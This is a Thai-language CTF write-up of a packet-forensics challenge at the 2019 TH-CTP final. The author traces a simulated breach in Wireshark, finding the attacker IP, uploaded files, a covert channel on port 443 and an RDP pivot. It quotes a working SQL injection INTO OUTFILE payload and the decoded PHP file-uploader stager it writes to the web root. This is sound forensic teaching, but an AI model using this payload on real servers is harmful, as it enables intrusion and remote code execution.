---

title: "ประสบการณ์แข่งขัน TH-CTP รอบ Final พร้อม Writeup By FC @NooM2"
date: 2019-10-09T12:14:11+07:00
draft: false
featured_image: "/images/ctp-final-writeup/1.png"
featured_image_caption: "ประสบการณ์การแข่งขันTH-CTP รอบ Final พร้อม Writeup By FC @NooM2 อิอิ"
categories: ["CTF Writeup"]
---

![](/images/ctp-final-writeup/1.png)

เมื่อวันอาทิตย์ที่ผ่านมาได้มีโอกาสไปแข่งงาน CTP - Capture The Packet รอบ Final ซึ่งเป็นครั้งแรกของประเทศไทย ในการแข่งขันนี้ทีมของเราใช้ชื่อว่า **"FC @NooM2"** (จริง ๆ ใส่ FC @NooM เฉย ๆ แต่บังเอิญมีทีมที่ใช้ชื่อเดียวกันสองทีม เค้าเลยเติมเลข 2 ให้ 😂)

แต่ก่อนจะไปแข่งขันรอบ Final เราต้องแข่งขันรอบ Qualify ก่อน โดยทางผู้จัดจะคัดเอาทีมที่ได้คะแนนดีที่สุด 20 ทีมแรก การแข่งขันรอบ Qualify เหมือนการแข่งขัน CTF รูปแบบ Jeopady แต่โจทย์จะเป็น pcap ทั้งหมด ซึ่งเราชอบโจทย์มาก หลากหลายดี โจทย์ไม่ยากไปกำลังทำสนุก โดยระยะเวลาการทำโจทย์ให้เวลาทำประมาณ 3 วัน

รายชื่อทีมที่เข้ารอบ Final

![](/images/ctp-final-writeup/2.png)

> ใช่ครับ ไม่มีทีมเรา เราได้ที่ 21 แต่โชคดีที่มีทีมสละสิทธิ์
> ทำให้เราได้บังเอิญได้เข้าไปแข่งรอบ Final นั่นเอง

ซึ่งการแข่งขันรอบ Final ก็คล้าย ๆ รอบ Qualify เลย เพียงแต่เราต้องไปแข่งกันที่ MFEC ด้วยขนาดของสถานที่จัดเองทำให้ต้องนั่งติดกันมาก ๆ เวลาคุยกันต้องระวัง คุยกันเบาหน่อยเพื่อไม่ให้ทีมอื่นได้ยิน

ส่วนรูปแบบของโจทย์ยังคงเป็น Jeopardy เหมือนเดิมแต่ที่ทำให้รอบนี้ท้าทายกว่าเดิมคือยิ่งเราส่ง Flag ข้อนั้นช้า เรายิ่งได้คะแนนน้อยลง นั่นหมายความว่าการที่จะชนะการแข่งขันนี้ได้เราต้องเป็นทีมที่ทำให้ได้เร็วที่สุดในแต่ละข้อ แต่รูปแบบการแข่งขันแบบนี้มีข้อดีตรงที่ทำให้เราไม่สามารถกั้ก Flag ได้(ยิ่งกั้กคะแนนยิ่งน้อย) ทำให้เรารู้คะแนนจริง ๆ ว่าตอนนั้นเราอยู่อันดับที่เท่าไร

ซึ่งในการแข่งขันมีโจทย์ข้อนึงที่ชอบมากคือข้อที่มีคะแนนมากที่สุด 850 คะแนนซึ่งเป็นข้อที่มีสถานการณ์จำลองที่องค์กรโดน Hack แล้วให้หาคำตอบของคำถามต่าง ๆ อย่างเช่นว่า Attacker IP ไหน ไฟล์ที่อัพโหลดมาเป็นไฟล์อะไร เราว่าน่าสนใจดีเลยตัดสินใจว่าจะมาเขียน WriteUp  ของข้อนี้

## ข้อ Greenland 850 point

*ต้องบอกก่อนว่าผมไม่ได้อธิบายละเอียด แค่เล่าว่าตอนนั้นคิดยังไง ไม่ได้มีการทำ Timeline อะไรชัดเจน เน้นหาคำตอบในแต่ละข้อมากกว่าครับ*

มีข้อย่อยทั้งหมด 7 ข้อ(เราไม่แน่ใจว่าจำถูกทั้งหมดมั้ย แต่น่าจะประมาณนี้)
ทีมเราทำได้ 6 จาก 7 ข้อ

โดยโจทย์จะให้สถานการณ์จำลองมาว่า
Rose ได้ส่งอีเมล์อะไรบางอย่างไปให้ Administrator เมื่อวันที่ 13/7/2012 (อันนี้ไม่แน่ใจว่าเราจำวันที่ถูกมั้ย) แต่ Rose ได้ปฎิเสธว่าไม่ได้เป็นคนทำ จึงเกิดการตรวจสอบว่าเกิดอะไรกับระบบขึ้น

พร้อมให้ไฟล์ที่เป็นข้อมูลต่าง ๆ ของระบบมาดังนี้

![](/images/ctp-final-writeup/3.png)

แล้วมีคำถามว่าให้ 7 ข้อ

1. IP ของ Attacker คืออะไร
2. Malicious code แรกที่ Attacker upload ชื่ออะไร
3. Malicious code ที่สองที่ Attacker Upload ชื่ออะไร
4. Port ที่ Attacker ใช้ในการทำ Convert Channal เพื่อติดต่อกับ Attacker
5. *ชื่อ Snort log แจ้งเตือนการโจมตี Convert Channal(ข้อนี้ทำไม่ได้)*
6. Accout ที่ hacker สร้างขึ้นมา
7. Port ที่ Hacker ใช้เป็นช่องทางหลักในการเชื่อมต่อกับ Management server

จากรูปด้านบนจะเห็นว่ามีไฟล์ Topology มาให้ด้วย

![](/images/ctp-final-writeup/4.png)



ทำให้เห็นว่าระบบที่เราต้องมาตรวจสอบมีทั้งหมด 3 ส่วนคือ Internet, Client และ DMZ โดยมี Firewall คั่นในแต่ละโซน

### ข้อ 1 IP ของ Attacker คืออะไร

ตอนแรกที่เริ่มทำโจทย์ข้อนี้เราเริ่มจากการเปิดไฟล์  "Traffic Captured.pcap" ก่อน จากรูปด้านบนเราคิดว่าโซนที่ Hacker น่าจะโจมตีเข้ามาน่าจะเป็น DMZ โดยในโซนนี้มี Service อยู่ 3 อย่างคือ Domain, Mail, Web server ตอนที่ทำเราเริ่มทำที่ Web server Service เลย Filter http เพื่อดู Packet ที่มีการส่ง

![](/images/ctp-final-writeup/5.png)

แล้วจะเห็นว่าเหมือนมี Query ที่ทำ SQL Injection มาจาก **IP 73.74.203.9** นั่นหมายความว่าถ้าเราเข้าใจไม่ผิดแสดงว่า IP นี้น่าจะเป็น IP Attacker จึงลองเอาไปตอบดู ปรากฎว่าถูก! ก็ได้ไปแล้วข้อ(1)



### ข้อ 2 Malicious code แรกที่ Attacker upload ชื่ออะไร

เมื่อตอนนี้เรารู้ IP ของ Attacker แล้ว เราอยากดู Packet ที่ส่งระหว่างเครื่อง Attacker และ Web Server บน Protocol HTTP เราจึงเขียน Query ได้ดังนี้

`http && ip.addr == 73.74.203.9 && ip.addr == 192.168.100.4`

จากนั้นเราลองไปดูว่าจาก SQL Injection เนี่ย Attacker ทำอะไรไปบ้าง จนเราไปเจอ Query ที่น่าสนใจอันนึง

![](/images/ctp-final-writeup/6.png)

ลองเอาไป URL Decode ออกมาดูเพื่อให้มันอ่านง่ายขึ้น จะเห็นว่าเหมือนทำการเขียนค่าอะไรบางอย่างลงไปใน**ไฟล์ "tmpudiqc.php"**  ซึ่งไฟล์นี้เหมือนจะเป็นคำตอบของคำถามข้อ 2 (Malicious code แรกที่ Attacker upload ชื่ออะไร) เราจึงลองเอาไปตอบดูซึ่งก็ถูก!

```http
id=31 LIMIT 1 INTO OUTFILE 'c:/AppServ/www/tmpudiqc.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d2929207b0a20202020246469723d245f524551554553545b2275706c6f6164446972225d3b0a0a202020206966202870687076657273696f6e2829203c2027342e312e3027290a202020207b0a20202020202020202466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b0a2020202020202020406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c2024646972202e20222f22202e202466696c6529206f722064696528293b0a202020207d0a20202020656c73650a202020207b0a20202020202020202466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b0a2020202020202020406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c2024646972202e20222f22202e202466696c6529206f722064696528293b0a202020207d0a202020204063686d6f642824646972202e20222f22202e202466696c652c2030373535293b0a202020206563686f202246696c652075706c6f61646564223b0a7d0a656c7365207b0a202020206563686f20223c666f726d20616374696f6e3d22202e20245f5345525645525b225048505f53454c46225d202e2022206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d633a5c5c417070536572765c5c7777773e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b0a7d0a3f3e0a -- 

```

แต่ ๆๆๆ เพื่อความแน่ใจเราลองเอา Hex ด้านล่างไปแปลงเป็น ASCII ดูว่า Attacker เขียน Code อะไรไปในไฟล์ "tmpudiqc.php"

```php
<?php
if (isset($_REQUEST["upload"])) {
    $dir=$_REQUEST["uploadDir"];

    if (phpversion() < '4.1.0')
    {
        $file=$HTTP_POST_FILES["file"]["name"];
        @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or die();
    }
    else
    {
        $file=$_FILES["file"]["name"];
        @move_uploaded_file($_FILES["file"]["tmp_name"], $dir . "/" . $file) or die();
    }
    @chmod($dir . "/" . $file, 0755);
    echo "File uploaded";
}
else {
    echo "<form action=" . $_SERVER["PHP_SELF"] . " method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=c:\\AppServ\\www> <input type=submit name=upload value=upload></form>";
}
?>

```

จาก Code ด้านบนถ้าเราลองอ่านเร็ว ๆ จะเห็นว่าเป็น Code ที่ใช้ Upload ไฟล์ต่อไป ซึ่งพอเป็นแบบเนี้ย เราค่อนข้างแน่ใจแล้วว่าเราอาจจะได้คำตอบของคำถามที่ 3 ด้วย (Malicious code ที่สองที่ Attacker Upload ชื่ออะไร) 

### ข้อที่ 3 Malicious code ที่สองที่ Attacker Upload ชื่ออะไร

เราจึงลองไล่ดูจาก Packet ที่เรา Filter ต่อไป ซึ่งถ้าลองลองไล่ดูจะเห็นว่ามีการ Upload ไฟล์หลาย ๆ ไฟล์ 

![](/images/ctp-final-writeup/8.png)

แต่จะเห็นว่ามีการใช้ไฟล์ที่เริ่ม Upload จริง ๆ คือ test.php ซึ่ง Content ด้านในคือ php shell ที่รับ GET Parameter มา Execute คำสั่งเช่นอันแรกคือ dir คือลิสท์ไฟล์ในโฟลเดอร์ ต่อมามีการรัน reverse.exe (หลายรอบด้วย สงสันลืมเปิด nc รับ Connection 😁) ซึ่งถูก Upload มาก่อนหน้า ซึ่งเราลองเอาชื่อไฟล์นี้ไปตอบดู.... ไม่ได้แฮะ ตอนนั้นพี่ Staff เดินมาดูพอดี เลยบอกพี่เค้าเผื่อ Flag ผิด พี่เค้าเลยบอกให้ลองส่งใหม่ดู... ได้เฉย สรุป Flag ที่ใส่ใน Dashboard ผิด -___- 
เราเลยได้คำตอบขอข้อ 3 (Malicious code ที่สองที่ Attacker Upload ชื่ออะไร) คำตอบคือ reverse.exe

### ข้อที่ 4 Port ที่ Attacker ใช้ในการทำ Convert Channal เพื่อติดต่อกับ Attacker

ต่อมาเรามาดูข้อ 4 โจทย์ถามหาว่า "Port ที่ Attacker ใช้ในการทำ Convert Channal เพื่อติดต่อกับ Attacker" 
สิ่งที่เราทำคือเรา Filter โดยใช้ Filter ดังนี้

`ip.addr ==73.74.203.9 && ip.addr == 192.168.100.4`

จากนั้นไปที่ Statistics > Conversations จากนั้นติ้กถูกที่ "Limit to dusplay filter" ด้านล่าง จะเห็นว่าเหมือนมีการติดต่อจากเครื่อง Web Server (192.168.100.4) ไปยัง Attacker (73.74.203.9) ที่ port 443 เราจึงลองไป Filter ดู Packet เหล่านั้น  

![](/images/ctp-final-writeup/9.png)

`ip.addr==192.168.100.4 && tcp.port==1416 && ip.addr==73.74.203.9 && tcp.port==443`

เราจึงลองไปกด Follow Stream Packet ที่เรา Filter มาดู

![](/images/ctp-final-writeup/10.png)

คือปกติ port 443 เนี่ยจะเห็น port ของ HTTPS ซึ่งถูกเข้ารหัสไว้มันไม่ควรที่จะอ่านออกแสดงว่า port นี้อาจจะเป็น port ที่ Hacker ใช้ในการทำ Convert Channal เราจึงลองไปดูว่า port ไหนจะเห็นว่าเป็น Port 1416 เลยลองเอาไปตอบดู... ปรากฎว่าถูก เราเลยได้มาอีกข้อนึง ส่วนข้อ 5 หาไม่เจอ ไม่แน่ใจว่าเค้าลืมใส่ snort log มาให้ หรือให้เราเอา Firewall log ไปใส่ใน Snort แล้วดูผลเอง **ฉนั้นข้อนี้ขอข้ามครับขี้เกียจ**

### ข้อ 6 Accout ที่ hacker สร้างขึ้นมา

เรามาดูข้อ 6 ดีกว่าข้อนี้เทพออฟเป็นคนทำครับไปถามมา พี่เค้าบอกว่าในเมื่อเราโดน Compromise เมื่อวันที่ 13/07/2012 *แล้วเหมือน Hacker เข้าไปเปลี่ยน Password ของ Rose ก่อนแล้วค่อยสร้าง Account* (อันนี้ไม่แน่ใจนะครับผมอาจจะจำผิด ลองไปคุ้ย Log ดู) เราก็ไปดู log ของ Domain Server โดยดู Doamin-Security-Log.csv แล้วหา Account แปลก ๆ ซึ่งเราเจออยู่ Account นึง

![](/images/ctp-final-writeup/11.5.png)

Account นั้นคือ **Kurapiko** ซึ่งเราไม่เห็นใน Topology เลยลองเอาไปตอบดู... ถูกครับ เราได้คำตอบของข้อ 6 (Accout ที่ hacker สร้างขึ้นมา)

### ข้อ 7 Port ที่ Hacker ใช้เป็นช่องทางหลักในการเชื่อมต่อกับ Management server

ต่อมาเรามาดูข้อ 7 ต่อกันดีกว่าโจทย์ถามว่า "Port ที่ Hacker ใช้เป็นช่องทางหลักในการเชื่อมต่อกับ Management server" ข้อนี้พี่ออฟก็ทำเหมียนกัล ผมไปถามมาทีหลัง เรากลับมาดูที่ pcap กัน จากโจทย์ที่เรารู้คือเครื่อง IP ที่เราต้องไปสำรวจต่อคือ IP ของ Domain Server (192.168.100.2) กับ IP ของ Attacker(73.74.203.9) เลยลอง Filter ดู 

![](/images/ctp-final-writeup/11.png)

ไม่เจออะไรเลย ซึ่งก็น่าจะใช่ เพราะถ้าเราลองกลับไปดูที่ Topology จะเห็นว่ามี Firewall คั่นอยู่ซึ่งก็ไม่ควรให้มีการเข้าถึง Domain Server จาก IP ข้างนอกอยู่แล้ว งั้นเรามาดูความเป็นไปได้ต่อไปคือ เรารู้แล้วว่า Attacker ได้ Hack เครื่อง Web Server ได้แล้ว จึงมีความเป็นไปได้ว่า จะใช้เครื่องนี้เพื่อติดต่อกับ Domain Server จึงลอง Filter ใหม่

`ip.addr == 192.168.100.2 && ip.addr == 192.168.100.4`

แล้วไปที่ Statistics > Conversations แล้วติ้ก Limit to display filter เหมียนเดิมจ้า  ซึ่งข้อนี้เราหา Port ผมเลยลาก port A กับ port B มาให้ติดกันจะได้ดูง่าย ๆ พร้อมกับ กด Sort ตามจำนวน Packets เพื่อหาว่ามีการส่งข้อมูลกันที่ port ไหนเยอะ ๆ 

![](/images/ctp-final-writeup/12.png)

จะเห็นว่ามีการติดต่อจากเครื่อง Web Server ไปที่ Domain Server โดยใช้ Port 3389 ซึ่งเป็น Well known port ว่าเป็น Service ของ RDP และความเป็นจริงคือมันไม่ควรมีการ Remote Desktop จาก เครื่อง Web Server ด้วย ฉนั้น Port นี้น่าจะเป็นคำตอบของข้อ 7 (Port ที่ Hacker ใช้เป็นช่องทางหลักในการเชื่อมต่อกับ Management server) แล้วเอาไปตอบดูก็ถูกจริง ๆ ด้วย เย้! หลังจากทำข้อนี้เสร็จประมาณ 10 นาทีก็หมดเวลาการแข่งขันแล้วก็ประกาศผลการแข่งขัน

![](/images/ctp-final-writeup/13.png)

![](/images/ctp-final-writeup/14.png)

โดยที่หนึ่งได้เงินรางวัล 30,000 บาท เหรียญรางวัล 2 เหรียญ พร้อมป้ายไฟและสิทธิ์ในการโม้ว่าเป็น "สุดยอดด้านการวิเคราะห์ Packet" อิอิ โม้แพ้พพพพ

{{< tweet 1180790414485282817 >}}

ขอบคุณที่อ่านจนจบนะครับ รวม ๆ เป็นการแข่งขันที่สนุกมาก ๆ งานนึง ปีหน้าอยากให้มีข้อแบบที่มาเขียน Writeup เยอะ ๆ 

ถ้าอ่านแล้วเห็นว่าผมเขียนหรือคิดผิดตรงไหนบอกผมได้เลยนะครับ เพราะที่เขียนนี่ก็ไม่ได้แน่ใจว่าจะถูก 100% นะครับ 🤣

สงสัยตรงไหนทักไปถาม @NooM ได้เลยครับ